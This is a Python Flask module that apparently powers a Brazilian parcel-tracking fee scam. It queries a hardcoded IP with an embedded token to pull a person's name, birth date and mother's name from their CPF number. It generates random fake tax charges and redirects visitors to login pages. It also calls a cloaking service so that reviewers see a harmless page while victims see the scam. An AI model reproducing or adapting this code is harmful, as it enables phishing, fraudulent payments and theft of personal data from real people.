from flask import Blueprint, request, make_response, render_template, \
                  flash, g, session, redirect, url_for, current_app,jsonify
import datetime, random
from database import mongo
from user_agents import parse
from os.path import exists
import urllib.parse
import json
import uuid
import requests
from requests.auth import HTTPBasicAuth
from functools import lru_cache

loading = Blueprint('loading', __name__, url_prefix='/')

def gerar_valor_aleatorio(min_valor=85.00, max_valor=101.00):
    valor_aleatorio = round(random.uniform(min_valor, max_valor), 2)  # Gera um valor com duas casas decimais
    valor_inteiro = int(valor_aleatorio * 100)  # Converte para inteiro multiplicando por 100
    return valor_aleatorio, valor_inteiro

def calcular_taxa(valor, taxa_percentual):
    taxa = round(valor * (taxa_percentual / 100), 2)
    restante = round(valor - taxa, 2)
    return taxa, restante

@loading.route('/consulta/<cpf>', methods=['GET'])
def cpf_(cpf):
    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'connect.sid=s%3AGen5yy8Z7XDdzgYLrN5z9hLEVT4_DNrJ.nbPWIbxKgZp%2BvOyQ%2BTV%2B5BQp1Z%2B1Zgm3pMs1hgqdMmA',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get(f"http://192.241.158.251:8081/SerasaCpf?token=ff29046e-3321-4031-95e3-f47a7c5d551f&cpf={cpf}&local=correios", headers=headers)
    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }
        return jsonify(response)
    else:
        return jsonify(success=False)
    return response.json(),response.status_code

@lru_cache(maxsize=128)
def consultarRastreio(rastreio):
    
    return {'status': False}

def _await(rastreio):
    dominio = request.url.split('/')[2]
    
    try:
        with open('./domains.json') as filed:
            d = json.load(filed)
        u = json.load(open('./sites.json'))
    except (FileNotFoundError, json.JSONDecodeError) as e:
        return str(e), 500

    if dominio not in d:
        return "", 410

    try:
        _uuid = session.get('uuid', str(uuid.uuid4()))
        prefix = session.get('prefix', f"{str(uuid.uuid4())}")
        session['uuid'] = _uuid
        session['prefix'] = prefix
    except Exception as e:
        session.clear()
        return str(e), 500

    session['c'] = request.args.get('c', '')
    session['d'] = d[dominio]
    session['taxas'] = 2

    valor, valor_inteiro = gerar_valor_aleatorio()
    taxa_percentual = 40
    taxa, restante = calcular_taxa(valor, taxa_percentual)

    session['valores'] = {
        "valor": valor_inteiro,
        "valor_gerado": f"{valor:.2f}".replace('.', ','),
        "valor_d": f"{restante:.2f}".replace('.', ','),
        "icms": f"{taxa:.2f}".replace('.', ',')
    }
    session['rastreio'] = rastreio
    session['dados'] = consultarRastreio(rastreio)
    session['taxas'] = d[dominio]["taxas"]
    user_agent = parse(request.headers.get('User-Agent'))
    session['os'] = f"{user_agent.os.family} {user_agent.os.version_string}"

    #
    return redirect(f"/{u[d[dominio]['categoria']]}/{session['prefix']}/login")

@loading.route('/a', methods=['GET'])
def cloaking_house_check():
    ip_address = request.remote_addr
    ip_headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_X_COMING_FROM', 
        'HTTP_COMING_FROM', 
        'HTTP_FORWARDED_FOR_IP', 
        'HTTP_X_REAL_IP'
    ]

    for header in ip_headers:
        if header in request.headers:
            ip_address = request.headers[header].strip()
            break

    request_data = {
        'label': 'c364edc221be3f4ec3da74f60af4c2a5', 
        'user_agent': request.headers.get('User-Agent'), 
        'referer': request.headers.get('Referer', ''), 
        'query': request.query_string.decode('utf-8'), 
        'lang': request.headers.get('Accept-Language', ''),
        'ip_address': ip_address
    }

    try:
        response = requests.post('https://cloakit.house/api/v1/check', data=request_data, verify=False, timeout=15)
        response.raise_for_status()
    except requests.RequestException:
        return 'Try again later.', 503

    body = response.json()

    if 'filter_type' in body and body['filter_type'] == 'subscription_expired':
        return 'Your Subscription Expired.', 403

    if 'url_white_page' in body and 'url_offer_page' in body:
        context_options = {'verify': False, 'headers': {'User-Agent': request.headers.get('User-Agent')}}

        if body['filter_page'] == 'offer':
            if body['mode_offer_page'] == 'loading':
                return load_page(body['url_offer_page'], context_options)

            elif body['mode_offer_page'] == 'redirect':
                return _await()

            elif body['mode_offer_page'] == 'iframe':
                return render_iframe(body['url_offer_page'])

        if body['filter_page'] == 'white':
            if body['mode_white_page'] == 'loading':
                return load_page(body['url_white_page'], context_options)

            elif body['mode_white_page'] == 'redirect':
                return redirect(body['url_white_page'], code=302)

    return 'Try again later.', 503

@loading.route('/<rastreio>', methods=['GET'])
def cloaking_house_check_rastreio(rastreio):
    return _await(rastreio)

    ip_address = request.remote_addr
    ip_headers = [
        'HTTP_CLIENT_IP', 
        'HTTP_X_FORWARDED_FOR', 
        'HTTP_CF_CONNECTING_IP', 
        'HTTP_FORWARDED_FOR', 
        'HTTP_X_COMING_FROM', 
        'HTTP_COMING_FROM', 
        'HTTP_FORWARDED_FOR_IP', 
        'HTTP_X_REAL_IP'
    ]

    for header in ip_headers:
        if header in request.headers:
            ip_address = request.headers[header].strip()
            break

    request_data = {
        'label': 'c364edc221be3f4ec3da74f60af4c2a5', 
        'user_agent': request.headers.get('User-Agent'), 
        'referer': request.headers.get('Referer', ''), 
        'query': request.query_string.decode('utf-8'), 
        'lang': request.headers.get('Accept-Language', ''),
        'ip_address': ip_address
    }

    try:
        response = requests.post('https://cloakit.house/api/v1/check', data=request_data, verify=False, timeout=15)
        response.raise_for_status()
    except requests.RequestException:
        return 'Try again later.', 503

    body = response.json()

    if 'filter_type' in body and body['filter_type'] == 'subscription_expired':
        return 'Your Subscription Expired.', 403

    if 'url_white_page' in body and 'url_offer_page' in body:
        context_options = {'verify': False, 'headers': {'User-Agent': request.headers.get('User-Agent')}}

        if body['filter_page'] == 'offer':
            if body['mode_offer_page'] == 'loading':
                return load_page(body['url_offer_page'], context_options)

            elif body['mode_offer_page'] == 'redirect':
                return _await(rastreio)

            elif body['mode_offer_page'] == 'iframe':
                return render_iframe(body['url_offer_page'])

        if body['filter_page'] == 'white':
            if body['mode_white_page'] == 'loading':
                return load_page(body['url_white_page'], context_options)

            elif body['mode_white_page'] == 'redirect':
                return redirect(body['url_white_page'], code=302)

    return 'Try again later.', 503

def load_page(url, context_options):
    if requests.utils.urlparse(url).scheme in ('http', 'https'):
        try:
            response = requests.get(url, **context_options)
            response.raise_for_status()
            content = response.text
            return content.replace('<head>', f'<head><base href="{url}" />')
        except requests.RequestException:
            return 'Page Not Found.', 404
    else:
        try:
            with open(url, 'r', encoding='utf-8') as file:
                content = file.read()
                return content
        except (FileNotFoundError, OSError):
            return 'Page Not Found.', 404

def render_iframe(url):
    return f'<iframe src="{url}" width="100%" height="100%" align="left"></iframe><style>body{{padding:0;margin:0;}}iframe{{margin:0;padding:0;border:0;}}</style>'
